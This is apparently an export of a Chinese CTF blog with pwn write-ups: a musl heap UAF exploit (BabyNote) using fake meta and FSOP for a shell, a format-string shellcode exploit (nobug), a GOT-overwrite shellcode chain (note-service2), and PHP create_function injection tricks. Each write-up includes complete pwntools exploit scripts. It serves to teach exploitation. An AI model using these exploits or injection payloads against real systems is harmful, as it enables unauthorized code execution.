是否指向对应的group\tassert(index &lt;= meta-&gt;last_idx);// 检查chunk idx 是否超过 meta 最大chunk 容量\tassert(!(meta-&gt;avail_mask &amp; (1u&lt;&lt;index)));\tassert(!(meta-&gt;freed_mask &amp; (1u&lt;&lt;index)));\tconst struct meta_area *area = (void *)((uintptr_t)meta &amp; -4096);// 得到meta_area 地址\tassert(area-&gt;check == ctx.secret);// 检查 check 校验值\tif (meta-&gt;sizeclass &lt; 48) &#123;// 检查是否属于 sizeclasses 管理的chunk 大小\t\tassert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);\t\tassert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+1));\t&#125; else &#123;\t\tassert(meta-&gt;sizeclass == 63);\t&#125;\tif (meta-&gt;maplen) &#123;\t\tassert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);\t&#125;\treturn (struct meta *)meta;&#125;\n\nstatic struct mapinfo nontrivial_free(struct meta *g, int i)&#123;\tuint32_t self = 1u&lt;&lt;i;\tint sc = g-&gt;sizeclass;\tuint32_t mask = g-&gt;freed_mask | g-&gt;avail_mask;\tif (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g)) &#123;        // 要么释放要么可用，且该meta可以被释放\t\t// any multi-slot group is necessarily on an active list\t\t// here, but single-slot groups might or might not be.\t\tif (g-&gt;next) &#123;            // 如果队列中 有下一个meta\t\t\tassert(sc &lt; 48);\t\t\tint activate_new = (ctx.active[sc]==g);\t\t\tdequeue(&amp;ctx.active[sc], g);            // 在出队操作后 ,ctx.active[sc]==meta -&gt;next  是指的刚刚出队meta 的下一个meta\t\t\tif (activate_new &amp;&amp; ctx.active[sc])\t\t\t\tactivate_group(ctx.active[sc]);\t\t&#125;\t\treturn free_group(g);\t&#125; else if (!mask) &#123;\t\tassert(sc &lt; 48);\t\t// might still be active if there were no allocations\t\t// after last available slot was taken.\t\tif (ctx.active[sc] != g) &#123;\t\t\tqueue(&amp;ctx.active[sc], g);\t\t&#125;\t&#125;\ta_or(&amp;g-&gt;freed_mask, self);\treturn (struct mapinfo)&#123; 0 &#125;;&#125;\n\nstatic inline void dequeue(struct meta **phead, struct meta *m)&#123;\tif (m-&gt;next != m) &#123;\t\tm-&gt;prev-&gt;next = m-&gt;next;\t\tm-&gt;next-&gt;prev = m-&gt;prev;\t\tif (*phead == m) *phead = m-&gt;next;\t&#125; else &#123;\t\t*phead = 0;\t&#125;\tm-&gt;prev = m-&gt;next = 0;&#125;\n\n这里存在不安全的解链操作了\n可以看到没有任何的安全检测就直接往prev写入值了。那么这里进入到dequeue的条件主要有两点：\n\n第一种:如果一个group 中所有的chunk 都已经被使用，且没有free掉的chunk\n第二种:group 中的chunk 当free掉最后一个chunk，都处于freed的状态\n\nBabyNote题目分析这道题的逆向过程也不是很难，可以知道题目维护的是一个单链表的结构\n在比赛期间没发现这道题的漏洞，看了wp发现我少考虑了一种极端情况\nunsigned __int64 sub_16A1()&#123;  void *v1; // [rsp+8h] [rbp-28h] BYREF  __int64 *i; // [rsp+10h] [rbp-20h]  __int64 v3; // [rsp+18h] [rbp-18h]  void *ptr; // [rsp+20h] [rbp-10h]  unsigned __int64 v5; // [rsp+28h] [rbp-8h]  v5 = __readfsqword(0x28u);  v1 = 0LL;  v3 = give_name((__int64 *)&amp;v1);  ptr = (void *)_int_find(v1, v3);  if ( ptr )  &#123;    if ( ptr != (void *)chunk_start || *(_QWORD *)(chunk_start + 0x20) )    &#123;      if ( *((_QWORD *)ptr + 4) )      &#123;        for ( i = &amp;chunk_start; ptr != (void *)*i; i = (__int64 *)(*i + 0x20) )          ;        *i = *((_QWORD *)ptr + 4);      &#125;    &#125;    else    &#123;      chunk_start = 0LL;    &#125;    free(*(void **)ptr);    free(*((void **)ptr + 1));    free(ptr);    puts(&quot;ok&quot;);  &#125;  else  &#123;    puts(&quot;oops.....&quot;);  &#125;  free(v1);  return __readfsqword(0x28u) ^ v5;&#125;unsigned __int64 sub_16A1()&#123;  void *v1; // [rsp+8h] [rbp-28h] BYREF  __int64 *i; // [rsp+10h] [rbp-20h]  __int64 v3; // [rsp+18h] [rbp-18h]  void *ptr; // [rsp+20h] [rbp-10h]  unsigned __int64 v5; // [rsp+28h] [rbp-8h]  v5 = __readfsqword(0x28u);  v1 = 0LL;  v3 = give_name((__int64 *)&amp;v1);  ptr = (void *)_int_find(v1, v3);  if ( ptr )  &#123;    if ( ptr != (void *)chunk_start || *(_QWORD *)(chunk_start + 0x20) )    &#123;      if ( *((_QWORD *)ptr + 4) )      &#123;        for ( i = &amp;chunk_start; ptr != (void *)*i; i = (__int64 *)(*i + 0x20) )          ;        *i = *((_QWORD *)ptr + 4);      &#125;    &#125;    else    &#123;      chunk_start = 0LL;    &#125;    free(*(void **)ptr);    free(*((void **)ptr + 1));    free(ptr);    puts(&quot;ok&quot;);  &#125;  else  &#123;    puts(&quot;oops.....&quot;);  &#125;  free(v1);  return __readfsqword(0x28u) ^ v5;&#125;\n\n也就是当最后一个结点(也是第一个生成的结点)被删除的时候，倒数第二个结点(也就是第二个生成的结点)的next指针还是会指向最后一个结点，这也就造成了UAF\n利用过程首先生成UAF的chunk\ncreate(0x38, b&#x27;a&#x27; * 0x38, 0x28, b&#x27;a&#x27; * 0x28)create(0x38, b&#x27;b&#x27; * 0x38, 0x38, b&#x27;b&#x27; * 0x38)delete(0x38, b&#x27;a&#x27; * 0x38)\n\n\n可以看到其实已经是造成了UAF了\n这个时候我们如果在free的chunk这里生成一个管理堆块即可泄漏出堆地址，但是上面提到了musl在free后不会直接该表avail的值，而是等avail用完了才会根据freed修改avail。\n\n可以看到当前的meta，题目的show函数也是会创建chunk然后free掉的，所以修改掉即可。\nfor i in range(7):    find(0x28, b&#x27;a&#x27; * 0x28)\n\n\n那么下一次申请的管理堆块就会是我们上面的内容堆块\n我发现如果单纯的按照上面的操作会出现后面生成的管理堆会覆盖掉以前的管理堆导致破坏了UAF，所以我在前面新增了一段代码\ncreate(0x38, b&#x27;d&#x27; * 0x38, 0x38, b&#x27;d&#x27; * 0x38)for i in range(8):    find(0x28, b&#x27;a&#x27; * 0x28)\n\n\n从而达到这种效果，使我们造成UAF的管理堆块在group的最后，避免覆盖\n\n接着进行上面的步骤即可实现这一效果\n\n紧接着泄漏地址\n根据上面描述的，我们最终利用的其实是dequeue当中的任意地址写，但是在进入这个函数之前会检测secrt值，所以我们还需要泄漏一次，这次泄漏的思路和上面差不多，这里可以通过show函数修改掉我们最开始管理堆块即可进行泄漏。\n到这里已经泄漏完所有的东西了，下一步就是伪造IO_FILE进行FSOP来getshell了\nexpfrom pwn import *r = process(&#x27;babynote&#x27;)elf = ELF(&#x27;babynote&#x27;)libc = ELF(&#x27;libc.so&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def create(name_size, name, note_size, note):    r.recvuntil(b&#x27;option: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;name size: &#x27;)    r.sendline(bytes(str(name_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;name: &#x27;)    r.send(name)    r.recvuntil(b&#x27;note size: &#x27;)    r.sendline(bytes(str(note_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;note content: &#x27;)    r.send(note)def find(name_size, name):    r.recvuntil(b&#x27;option: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;name size: &#x27;)    r.sendline(bytes(str(name_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;name: &#x27;)    r.send(name)def delete(name_size, name):    r.recvuntil(b&#x27;option: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;name size: &#x27;)    r.sendline(bytes(str(name_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;name: &#x27;)    r.send(name)def forget():    r.recvuntil(b&#x27;option: &#x27;)    r.sendline(b&#x27;4&#x27;)create(0x38, b&#x27;d&#x27; * 0x38, 0x38, b&#x27;d&#x27; * 0x38)for i in range(8):    find(0x28, b&#x27;1&#x27; * 0x28)forget()create(0x38, b&#x27;a&#x27; * 0x38, 0x28, b&#x27;a&#x27; * 0x28)create(0x38, b&#x27;b&#x27; * 0x38, 0x38, b&#x27;b&#x27; * 0x38)delete(0x38, b&#x27;a&#x27; * 0x38)for i in range(6):    find(0x28, b&#x27;a&#x27; * 0x28)create(0x38, b&#x27;c&#x27; * 0x38, 0x58, b&#x27;c&#x27; * 0x58)find(0x38, b&#x27;a&#x27; * 0x38)r.recvuntil(b&#x27;0x28:&#x27;)elf_base = b&#x27;&#x27;libc_base = b&#x27;&#x27;for i in range(6):    elf_base = r.recv(2) + elf_baser.recv(4)for i in range(6):    libc_base = r.recv(2) + libc_baseelf_base = int(elf_base, base=16) - 0x4dc0libc_base = int(libc_base, base=16) - 0xb7870print(hex(elf_base))print(hex(libc_base))__malloc_context = libc_base + 0xb4ac0for i in range(6):    find(0x28, b&#x27;a&#x27; * 0x28)payload = flat(elf_base + 0x4cc0, __malloc_context, 0x38, 0x28, 0)find(0x28, payload)find(0x38, b&#x27;a&#x27; * 0x38)r.recvuntil(b&#x27;0x28:&#x27;)secret = b&#x27;&#x27;for i in range(8):    secret = r.recv(2) + secretsecret = int(secret, base=16)print(hex(secret))__stdout_used = libc_base + 0xb43b0heap_addr = libc_base - 0x7000system = libc_base + libc.symbols[&#x27;system&#x27;]fake_area_addr = heap_addr + 0x1000fake_meta_addr = fake_area_addr + 0x10fake_group_addr = fake_meta_addr + 0x30fake_IO_FILE_addr = fake_group_addr + 0x10fake_meta_area = flat(secret, 0)fake_meta = flat(fake_IO_FILE_addr, __stdout_used, fake_group_addr, (1 &lt;&lt; 1),                 (20 &lt;&lt; 6) | (1 &lt;&lt; 5) | 1 | (0xfff &lt;&lt; 12))fake_meta = fake_meta.ljust(0x30)fake_group = flat(fake_meta_addr, 0)fake_IO_FILE = b&#x27;/bin/sh\\x00&#x27; + b&#x27;a&#x27; * 0x20 + p64(0xdeadbeef) + b&#x27;X&#x27; * 8 + p64(    0xbeefdead) + p64(system) * 2fake_IO_FILE = fake_IO_FILE.ljust(0x500, b&quot;\\x00&quot;)payload = b&#x27;a&#x27; * (    0x1000 - 0x20) + fake_meta_area + fake_meta + fake_group + fake_IO_FILEpayload = payload.ljust(0x2000, b&quot;z&quot;)context.log_level = &#x27;debug&#x27;create(0x38, b&#x27;e&#x27; * 0x38, 0x2000, payload)fake_name_addr = elf_base + 0x4d80fake_note = flat(fake_name_addr, fake_IO_FILE_addr, 0x38, 0x38, 0)fake_note_addr = libc_base + 0xb7d50create(0x4, b&#x27;f&#x27; * 0x4, 0x28, fake_note)create(0x4, b&#x27;g&#x27; * 0x4, 0x38, b&#x27;h&#x27; * 0x38)find(0x28, b&#x27;a&#x27; * 0x28)find(0x28, b&#x27;a&#x27; * 0x28)payload = flat(elf_base + 0x4cc0, __malloc_context, 0x38, 0x28, fake_note_addr)find(0x28, payload)delete(0x38, b&#x27;h&#x27; * 0x38)r.recvuntil(b&#x27;option: &#x27;)r.sendline(b&#x27;5&#x27;)# gdb.attach(#     r,#     &#x27;dir /mnt/hgfs/download/musl/musl-1.2.2/musl-1.2.2/src/malloc\\ndir /mnt/hgfs/download/musl/musl-1.2.2/musl-1.2.2/src/malloc/mallocng\\nb free&#x27;# )r.interactive()\n\n构造meta这里再继续花上一点篇幅讲解一下怎么构造meta，其实看别人博客也把我看晕了，自己对照源码然后调试发现并不难，所以我的exp也就整体进行了缩减。\nstatic struct mapinfo nontrivial_free(struct meta *g, int i)&#123;\tuint32_t self = 1u&lt;&lt;i;\tint sc = g-&gt;sizeclass;\tuint32_t mask = g-&gt;freed_mask | g-&gt;avail_mask;\tif (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g)) &#123;\t\t// any multi-slot group is necessarily on an active list\t\t// here, but single-slot groups might or might not be.\t\tif (g-&gt;next) &#123;\t\t\tassert(sc &lt; 48);\t\t\tint activate_new = (ctx.active[sc]==g);\t\t\tdequeue(&amp;ctx.active[sc], g);\t\t\tif (activate_new &amp;&amp; ctx.active[sc])\t\t\t\tactivate_group(ctx.active[sc]);\t\t&#125;\t\treturn free_group(g);\t&#125;    ... ...&#125;\n\n可以看到我们如果想要进入dequeue需要进入if判断，并且内部还有个assert，我们需要绕过这两项。\n再关注一下meta结构\nstruct meta &#123;\tstruct meta *prev, *next;\tstruct group *mem;\tvolatile int avail_mask, freed_mask;\tuintptr_t last_idx:5;\tuintptr_t freeable:1;\tuintptr_t sizeclass:6;\tuintptr_t maplen:8*sizeof(uintptr_t)-12;&#125;;\n\n首先看if判断的第一个内容，我们先看一下在exp当中构造的meta的最后是什么形式表现的\n\n可以看到这里的avail_mask和freed_mask的或值是2等号左半边的值即为3，再看last_idx那么有半边也为3了，就轻松绕过了。再看后面的那个函数\nstatic int okay_to_free(struct meta *g)&#123;\tint sc = g-&gt;sizeclass;\tif (!g-&gt;freeable) return 0;\t// always free individual mmaps not suitable for reuse\tif (sc &gt;= 48 || get_stride(g) &lt; UNIT*size_classes[sc])\t\treturn 1;\t// always free groups allocated inside another group&#x27;s slot\t// since recreating them should not be expensive and they\t// might be blocking freeing of a much larger group.\tif (!g-&gt;maplen) return 1;\t// if there is another non-full group, free this one to\t// consolidate future allocations, reduce fragmentation.\tif (g-&gt;next != g) return 1;\t// free any group in a size class that&#x27;s not bouncing\tif (!is_bouncing(sc)) return 1;\tsize_t cnt = g-&gt;last_idx+1;\tsize_t usage = ctx.usage_by_class[sc];\t// if usage is high enough that a larger count should be\t// used, free the low-count group so a new one will be made.\tif (9*cnt &lt;= usage &amp;&amp; cnt &lt; 20)\t\treturn 1;\t// otherwise, keep the last group in a bouncing class.\treturn 0;&#125;\n\n我们只需要返回的结果不为0即可，所以对照上面的图片即可看到很轻松也是可以绕过的，最后则是里面的assert的不大于48，也是很简单就绕过了。但是在实验期间发现了一个新的检测，我把maplen删掉了之后出现了崩溃的情况，查看源码发现，maplen =0 表示group 不是新mmap 出来的在size_classes里，meta 一般申请的是堆空间brk 分配的，有可能是mmap 映射的，而group 都是使用的mmap 的空间。\nstatic struct mapinfo free_group(struct meta *g)&#123;\tstruct mapinfo mi = &#123; 0 &#125;;\tint sc = g-&gt;sizeclass;\tif (sc &lt; 48) &#123;\t\tctx.usage_by_class[sc] -= g-&gt;last_idx+1;\t&#125;\tif (g-&gt;maplen) &#123;\t\tstep_seq();\t\trecord_seq(sc);\t\tmi.base = g-&gt;mem;\t\tmi.len = g-&gt;maplen*4096UL;\t&#125; else &#123;\t\tvoid *p = g-&gt;mem;\t\tstruct meta *m = get_meta(p);\t\tint idx = get_slot_index(p);\t\tg-&gt;mem-&gt;meta = 0;\t\t// not checking size/reserved here; it&#x27;s intentionally invalid\t\tmi = nontrivial_free(m, idx);\t&#125;\tfree_meta(g);\treturn mi;&#125;\n\n源码这里也验证了，如果置为0就会进一步进行free，在get_meta就可会出现崩溃。其实在get_meta函数内存在很多assert都可以看一下，这里就不过多赘述了。\n\n参考链接：\nhttps://xz.aliyun.com/t/10326\nhttps://eqqie.cn/\n","categories":["pwn"],"tags":["musl"]},{"title":"nobug","url":"/2022/01/01/nobug/","content":"以前以为非栈上的格式化字符串应该跟栈上的差不多所以就没怎么去了解，可以说是完全没学非栈上的格式化字符串。\n%n\n在上图的红色框中存在一条链假定为p1-&gt;p2-&gt;p3-&gt;p4，我们都知道在gdb中第一列为地址，第二列为值，而第三列则是指针所指向的值。而%n实际上就是修改其第三列，就跟scanf(&quot;%d&quot;,&amp;n);同理。\n所以最终的效果就是我们使用%n修改值修改的是p3。下面回到题目。\n检查保护\n几乎什么都没开，重要的是没开nx保护，可以直接写shellcode。这次程序的代码有点长就不放上来了，存在这样一个函数sub_804869D，看起来很复杂还很长，我也不知道是什么看了wp发现是一个base64_decode。\n流程分析int sub_8048B76()&#123;  size_t v0; // eax  const char *v1; // eax  v0 = strlen(s);  v1 = sub_804869D(s, v0, 0);  return snprintf(byte_804A8A0, 0x800u, &quot;%s&quot;, v1);&#125;\n\n在输入完内容解密之后打印出来还没发现问题。\nint sub_8048B32()&#123;  size_t v0; // eax  const char *v1; // eax  v0 = strlen(s);  v1 = sub_804869D(s, v0, 0);  return snprintf(byte_804A8A0, 0x800u, v1);&#125;\n\n在这个函数发现了存在格式化字符串漏洞。但是看了一圈没找到什么地方会往这个函数执行。去看和漏洞函数很相似的上面那个函数的汇编代码的时候发现了\n.text:08048B76 sub_8048B76     proc near               ; CODE XREF: sub_8048BD4+6↓p.text:08048B76 ; __unwind &#123;.text:08048B76                 push    ebp.text:08048B77                 mov     ebp, esp.text:08048B79                 sub     esp, 18h.text:08048B7C                 mov     dword ptr [esp], offset s ; s.text:08048B83                 call    _strlen.text:08048B88                 mov     dword ptr [esp+8], 0.text:08048B90                 mov     [esp+4], eax.text:08048B94                 mov     dword ptr [esp], offset s.text:08048B9B                 call    sub_804869D.text:08048BA0                 mov     [esp+0Ch], eax.text:08048BA4                 mov     dword ptr [esp+8], offset format ; &quot;%s&quot;.text:08048BAC                 mov     dword ptr [esp+4], 800h ; maxlen.text:08048BB4                 mov     dword ptr [esp], offset byte_804A8A0 ; s.text:08048BBB                 call    _snprintf.text:08048BC0                 push    offset sub_8048BD1.text:08048BC5                 push    offset sub_8048B32.text:08048BCA                 push    0.text:08048BCC                 lea     esp, [esp+4].text:08048BD0                 retn\n\n下面几行会将sub_8048B32推进栈里，然后下面还有个lea正好吧esp改变过去了，所以是一定会去执行sub_8048B32这个函数的。\n在执行完sub_8048B32会发生什么？\n\n\n可以看到程序是利用了类似于ROP的思想进行的。\n利用分析\n发现疑似可利用的地方，马上调试程序\n\n 这就是刚刚找的东西，但是直接利用肯定不行。所以我们要构造出来p1-&gt;p2-&gt;p3的结构\n\n很容易可以看到ebp存在这样一条链子，0xffffce08也存在，我们若是让0xffffce08的值等于0xffffce0c那我们岂不是就构成了这样一条链子？\n0xffffce08-&gt;0xffffce0c-&gt;0x8048bdf这时候修改0x8048bdf到shellcode的地址就可以了。\n已知ebp为%4$，再结合文章开头所说的，那么我们就可以通过%4$修改%12$的值为%13$，然后利用%12$修改%13$的值为我们的shellcode。\nexpfrom pwn import *import base64elf = ELF(&#x27;./4f59876cebb1469ca62254c162306aa5&#x27;)# r = process(&#x27;./4f59876cebb1469ca62254c162306aa5&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 52730)context.arch = &#x27;i386&#x27;context.os = &#x27;linux&#x27;context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]shellcode_addr = 0x804A8A0r.sendline(base64.b64encode(b&#x27;%4$p&#x27;))ret_addr = int(r.recvuntil(b&#x27;\\n&#x27;, drop=True), 16)+4print(hex(ret_addr))shellcode = asm(shellcraft.sh())payload = shellcode+b&#x27;%&#x27; + \\    bytes(str((ret_addr &amp; 0xff)-len(shellcode)),          encoding=&#x27;utf8&#x27;)+b&#x27;c%4$hhn%&#x27; + \\    bytes(str((shellcode_addr &amp; 0xff)-(ret_addr &amp; 0xff)),          encoding=&#x27;utf8&#x27;)+b&#x27;c%12$hn&#x27;payload = base64.b64encode(payload)r.sendline(payload)r.interactive()\n\n参考文章https://www.cjovi.icu/WP/buu-xman_2019_format-wp.html\n","categories":["pwn-xctf"],"tags":["格式化字符串"]},{"title":"note-service2","url":"/2021/10/29/note-service2/","content":"检查保护\n开启了canary和pie但是没有开启nx，所以堆栈可以执行\n程序执行流程分析一道经典的菜单题目，具体流程可以看题目我在这里只放上有漏洞的代码\n有四个选项，一是增加note，二和三都还没完成，第四就是删掉note\n__int64 sub_CA5()&#123;  __int64 result; // rax  int v1; // [rsp+8h] [rbp-8h]  unsigned int v2; // [rsp+Ch] [rbp-4h]  result = (unsigned int)dword_20209C;  if ( dword_20209C &gt;= 0 )  &#123;    result = (unsigned int)dword_20209C;    if ( dword_20209C &lt;= 11 )    &#123;      printf(&quot;index:&quot;);      v1 = sub_B91();      printf(&quot;size:&quot;);      result = sub_B91();      v2 = result;      if ( (int)result &gt;= 0 &amp;&amp; (int)result &lt;= 8 )      &#123;        qword_2020A0[v1] = malloc((int)result);        if ( !qword_2020A0[v1] )        &#123;          puts(&quot;malloc error&quot;);          exit(0);        &#125;        printf(&quot;content:&quot;);        sub_B69(qword_2020A0[v1], v2);        result = (unsigned int)++dword_20209C;      &#125;    &#125;  &#125;  return result;&#125;\n\n在增加note的时候，首先输入索引值，然后创建一个chunk但是chunk的大小最大为8，又因为程序是堆栈可以执行所以考虑把shellcode写到堆当中。\nexecve对应的系统调用号是59所以amd64的shellcode需要完成的操作是:\nrax = 59rdi = &#x27;/bin/sh&#x27;rsi = 0rdx = 0syscall\n\n这肯定是超过了8字节，所以需要创建多个chunk然后连接起来，通过jmp连接，当我们malloc一个大小为8的chunk的时候他的结构其实是这样\n\n这样一个chunk里面只有fd的位置是我可以控制的，并且在我们可以控制的最后一个字节会被改写成0，所以我们实际可以控制的只有7个字节在构造的时候需要jmp的距离为bk+prev_size+size+1的大小。\n.text:0000000000000B1E                 jmp     short loc_B42.text:0000000000000B20 ; ---------------------------------------------------------------------------.text:0000000000000B20.text:0000000000000B20 loc_B20:                                ; CODE XREF: sub_AC3+49↑j.text:0000000000000B20                 mov     eax, [rbp+var_C].text:0000000000000B23                 movsxd  rdx, eax.text:0000000000000B26                 mov     rax, [rbp+var_18].text:0000000000000B2A                 add     rdx, rax.text:0000000000000B2D                 movzx   eax, [rbp+buf].text:0000000000000B31                 mov     [rdx], al.text:0000000000000B33                 add     [rbp+var_C], 1.text:0000000000000B37.text:0000000000000B37 loc_B37:                                ; CODE XREF: sub_AC3+2A↑j.text:0000000000000B37                 mov     eax, [rbp+var_1C].text:0000000000000B3A                 sub     eax, 1.text:0000000000000B3D                 cmp     eax, [rbp+var_C].text:0000000000000B40                 jg      short loc_AEF.text:0000000000000B42.text:0000000000000B42 loc_B42:  \n\n之间相差0x24个字节但是十六进制当中\n0000000000000B10  F4 48 63 D0 48 8B 45 E8  48 01 D0 C6 00 00 EB 22  ....H.E.........\n\n指令为0x22个字节，所以jmp short的跳跃数其实就是目标地址-当前地址-jmp short的大小\n所以跳跃的距离实际计算方式是bk+prev_size+size+1+2-2=0x19\n分析利用方式有了上面的思路，就需要想怎么往rdi放入’/bin/sh’了可以看到这个函数atoi(nptr);调用方式跟system一样并且nptr是可控的，那么就可以想到是篡改got表了\n.got.plt:0000000000202060 off_202060      dq offset atoi          ; DATA XREF: _atoi↑r.got.plt:0000000000202068 off_202068      dq offset exit          ; DATA XREF: _exit↑r.got.plt:0000000000202068 _got_plt        ends.got.plt:0000000000202068.data:0000000000202070 ; ===========================================================================.data:0000000000202070.data:0000000000202070 ; Segment type: Pure data.data:0000000000202070 ; Segment permissions: Read/Write.data:0000000000202070 _data           segment qword public &#x27;DATA&#x27; use64.data:0000000000202070                 assume cs:_data.data:0000000000202070                 ;org 202070h.data:0000000000202070                 db    0.data:0000000000202071                 db    0.data:0000000000202072                 db    0.data:0000000000202073                 db    0.data:0000000000202074                 db    0.data:0000000000202075                 db    0.data:0000000000202076                 db    0.data:0000000000202077                 db    0.data:0000000000202078 ; void *off_202078.data:0000000000202078 off_202078      dq offset off_202078    ; DATA XREF: sub_A10+17↑r.data:0000000000202078                                         ; .data:off_202078↓o.data:0000000000202078 _data           ends.data:0000000000202078.bss:0000000000202080 ; ===========================================================================.bss:0000000000202080.bss:0000000000202080 ; Segment type: Uninitialized.bss:0000000000202080 ; Segment permissions: Read/Write.bss:0000000000202080 _bss            segment align_32 public &#x27;BSS&#x27; use64.bss:0000000000202080                 assume cs:_bss.bss:0000000000202080                 ;org 202080h.bss:0000000000202080                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing.bss:0000000000202080                 public __bss_start.bss:0000000000202080 ; FILE *_bss_start.bss:0000000000202080 __bss_start     dq ?                    ; DATA XREF: LOAD:0000000000000480↑o.bss:0000000000202080                                         ; LOAD:0000000000000498↑o ....bss:0000000000202080                                         ; Alternative name is &#x27;_edata&#x27;.bss:0000000000202080                                         ; stdout.bss:0000000000202080                                         ; _edata.bss:0000000000202080                                         ; Copy of shared data.bss:0000000000202088                 align 10h.bss:0000000000202090                 public stdin.bss:0000000000202090 ; FILE *stdin.bss:0000000000202090 stdin           dq ?                    ; DATA XREF: LOAD:00000000000004C8↑o.bss:0000000000202090                                         ; sub_A80+4↑r.bss:0000000000202090                                         ; Copy of shared data.bss:0000000000202098 byte_202098     db ?                    ; DATA XREF: sub_A10↑r.bss:0000000000202098                                         ; sub_A10+29↑w.bss:0000000000202099                 align 4.bss:000000000020209C dword_20209C    dd ?                    ; DATA XREF: sub_CA5+8↑r.bss:000000000020209C                                         ; sub_CA5+16↑r ....bss:00000000002020A0 ; _QWORD qword_2020A0[12].bss:00000000002020A0 qword_2020A0    dq 0Ch dup(?)           ; DATA XREF: sub_BE0+18↑o\n\n可以看到堆最开始的地方和我们需要修改的位置距离为0x40字节，最上面的漏洞函数里面数组的索引是没有检测的，那dword_20209C[-8]也就是atoi函数got表的内容，并且不能一开是就修改，因为我们后面写shellcode是还需要atoi函数的\nshellcode写法在文章上面是写了我们要getshell需要的操作:\nmov rax,59mov rsi,0mov rdx,0syscall# rdi由我们自己写用atoi写入\n\n但是问题就出来了，上面的三条指令都已经是7字节了，所以我们需要将命令拆开\nxor rax,raxmov eax,59xor rsi,rsixor rdx,rdx\n\nexpfrom pwn import *elf = ELF(&#x27;./questions/1f10c9df3d784b5ba04b205c1610a11e&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 57872)# r = process(&#x27;./questions/1f10c9df3d784b5ba04b205c1610a11e&#x27;)context.arch = &#x27;amd64&#x27;# context.log_level = &#x27;debug&#x27;def add_note(index, content):    r.recvuntil(b&#x27;your choice&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;size:&#x27;)    r.sendline(bytes(str(8), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.send(content)def del_note(index):    r.recvuntil(b&#x27;your choice&gt;&gt; &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))code0 = asm(&#x27;xor rax,rax&#x27;)+b&#x27;\\x90\\x90\\xeb\\x19&#x27;code1 = asm(&#x27;mov eax,0x3b&#x27;)+b&#x27;\\xeb\\x19&#x27;code2 = asm(&#x27;xor rsi,rsi&#x27;)+b&#x27;\\x90\\x90\\xeb\\x19&#x27;code3 = asm(&#x27;xor rdx,rdx&#x27;)+b&#x27;\\x90\\x90\\xeb\\x19&#x27;code4 = asm(&#x27;syscall&#x27;).ljust(7, b&#x27;\\x90&#x27;)# 这里\\x90是nop指令add_note(0, code0)add_note(1, code1)add_note(2, code2)add_note(3, code3)add_note(4, code4)del_note(0)add_note(-8, code0)r.recvuntil(b&#x27;your choice&gt;&gt; &#x27;)r.sendline(b&#x27;/bin/sh&#x27;)r.interactive()\n\n\n\n\n\n","categories":["pwn-xctf"],"tags":["篡改got表"]},{"title":"ctf中php常被我忽略的细节","url":"/2021/09/17/php-detail/","content":"\nsession操作\n\n&lt;?php   \t//在最开始使用session_start();    session_start();\t//根据用户传到后台的sessionId找到相应的文件，可以在phpinfo()里找到session_save_path\t$_SEESION[&#x27;username&#x27;]//可以访问到文件中存放的session值?&gt;\n\n&lt;?php    //在存放session时比如    $_SEESION[&#x27;username&#x27;]=&quot;admin&quot;    //在本地文件中的存放形式为：username|s:5:&quot;admin&quot;    //当中的`|`为键值对的符号\n\n\ncreate_function绕过\n\n&lt;?php    //在php里面有create_function方法    create_function(&quot;$a,$b&quot;,&quot;return $a*$b&quot;);?&gt;以上代码等价于&lt;?php    function name($a,$b)&#123;    return $a*$b;\t&#125;\t//所以就有了思路去绕过\t//假如上传的请求体的参数会占据create_function里面的任意的一个参数\t$a=$_GET[&#x27;id&#x27;];\tcreate_function($a,&quot;&quot;);?&gt;使用payload:&#x27;)&#123;&#125;执行代码;//&#x27;&lt;?php    //产生的结果就为    function name()&#123;&#125;执行代码;//&#123;&#125;?&gt;当然在后面的那一个参数也可以类比了payload:&#x27;&#125;code;//&#x27;&lt;?php    function name()&#123;&#125;code;//&#125;?&gt;\n\n\n绕过preg_match\n\n&lt;?php    preg_match(&quot;/^[0-9,a-z_]$/isD&quot;)    //在绕过这个函数的时候应为后面存在s所以可以尝试?&gt;可用python写脚本找到断点\n\nimport requestsfor i in range(256):    var=hex(i)[2:]    if(len(var)&lt;2):        var=&quot;0&quot;+var    var=&quot;%&quot;+var    url=&quot;http://172.17.0.2/study/php_view/test.php?wow=&quot;+var+&quot;b=dzhsb&quot;    res=requests.get(url=url).text    if(&quot;dzhsb&quot; in res):        print(url)        break# 可以获得断点# 